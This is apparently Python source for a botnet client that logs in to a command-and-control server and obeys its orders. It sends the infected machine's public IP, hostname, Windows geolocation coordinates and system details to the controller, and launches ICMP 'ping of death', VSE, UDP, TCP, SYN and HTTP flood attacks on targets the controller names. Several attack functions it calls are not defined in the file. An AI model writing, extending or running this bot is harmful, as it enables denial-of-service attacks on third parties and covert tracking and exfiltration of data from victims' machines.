import time
# time.sleep(20)

import socket
import threading
import random
import requests
import setproctitle
from scapy.all import *
import geocoder
import winsdk.windows.devices.geolocation as wdg
import asyncio
import platform

# Configuration
C2_ADDRESS  = '127.0.0.1'
C2_PORT     = 80

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]

def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())


def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))

            while 1:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break

            while 1:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break

            break
        except:
            time.sleep(5) # retry in 5 seconds if connection fails

    while 1:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break

            args = data.split(' ')
            command = args[0].upper()

            if (command == "INFO_REQUEST_SIMPLE"):
                c2.send(f'IP: {requests.get("https://checkip.amazonaws.com").text.strip()}\r\nUser: {socket.gethostname()}\r\nNote: {NOTE}\r\n'.encode())

            elif (command == "INFO_REQUEST_ADVANCED"):
                ipaddress = requests.get("https://checkip.amazonaws.com").text.strip()
                username = socket.gethostname()

                async def GetCoords():
                    locator = wdg.Geolocator()
                    pos = await locator.get_geoposition_async()
                    return [pos.coordinate.latitude, pos.coordinate.longitude]

                def GetLoc():
                    return asyncio.run(GetCoords())

                def SystemInfo():
                    system = platform.system()
                    release = platform.release()
                    version = platform.version()
                    s = ' '
                    return system+s+release+s+version

                c2.send(f'IP: {ipaddress}\r\nCoordinates: {GetLoc()}\r\nUser: {username}\r\nSystem: {SystemInfo()}\r\nNote: {NOTE}\r\n'.encode())

            elif ("DEATH_PING" in command):
                command.replace("DEATH_PING", "")
                ip_sent, packets_to_send = command.split("||")
                source_ip = requests.get("https://checkip.amazonaws.com").text.strip()
                target_ip = ip_sent
                message = "T"
                packets = packets_to_send

                TheBigD = IP(src=source_ip, dst=target_ip)/ICMP()/(message*60000)
                for i in range(100):
                    try:
                        send(packets*TheBigD)
                    except:
                        break

            elif command == '.VSE':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()

            elif command == '.UDP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()

            elif command == '.TCP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

            elif command == '.SYN':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()

            elif command == '.HTTP':
                ip = args[1]
                secs = time.time() + int(args[2])
                threads = int(args[3])

                for _ in range(threads):
                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()

            elif command == 'PING':
                c2.send('PONG'.encode())


            else:
                pass
        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass
